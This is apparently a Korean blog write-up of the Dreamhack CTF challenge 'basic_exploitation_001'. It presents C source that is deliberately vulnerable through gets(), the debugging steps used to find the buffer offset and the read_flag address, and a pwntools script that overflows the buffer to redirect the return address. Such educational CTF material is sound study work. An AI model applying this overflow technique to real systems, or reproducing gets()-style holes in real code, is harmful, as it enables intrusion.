---
title: "[Dreamhack] basic_exploitation_001 Write up"
author: d0razi
date: 2023-08-09 12:30
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
toc: false
image: /assets/img/media/banner/dreamhack.jpg
---

# C 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

main 함수 부분에 gets함수에서 버퍼오버플로우를 발생시켜서 return주소를 read_flag주소로 덮으면 문제가 해결 될 것 같습니다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- buf에서 SFP까지의 거리
- read_flag함수의 주소

디버깅은 peda를 사용했습니다.

가장먼저 쉽게 알수있는 read_flag 함수의 주소를 info func 명령어를 사용해서 알아냈다.

![read_flag : 0x080485b9](/assets/img/media/post_img/dreamhack/basic_ex_001/Untitled.png)

read_flag : 0x080485b9

그리고 buf에서 sfp까지 오프셋을 알기 위해  disas main으로 메인함수를 보자

![main+11번째를 보면 ebp-0x80를 eax에 옮겨주는걸 볼 수 있다. 고로 ebp에서 buf까지는 0x80만큼 떨어져있다는 걸 알 수 있다.](/assets/img/media/post_img/dreamhack/basic_ex_001/Untitled%201.png)

main+11번째를 보면 ebp-0x80를 eax에 옮겨주는걸 볼 수 있다. 고로 ebp에서 buf까지는 0x80만큼 떨어져있다는 걸 알 수 있다.

- buf ↔ ebp : 0x80
- read_flag : 0x080485b9

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보자.

---

# Exploit

```python
from pwn import *

#p = remote('host3.dreamhack.games',9550)
p = process('./basic_exploitation_001')

pay = b'A' * 0x80
pay += b'A' * 0x4
pay += p32(0x080485b9)
p.sendline(pay)
p.interactive()
```

buf에서 ebp만큼 0x80 떨어져있기 때문에 더미데이터를 0x80만큼 채워준다.

현재 구조를 간단하게 그려보면 아래 그림처럼 되어있다.

![Untitled](/assets/img/media/post_img/dreamhack/basic_ex_001/Untitled%202.png)

0x80만큼 채웠으니 SFP만큼 0x4만큼 추가로 더미데이터를 채워주고 RET주소를 read_flag 주소로 조작해주면 성공한다.

![Untitled](/assets/img/media/post_img/dreamhack/basic_ex_001/Untitled%203.png)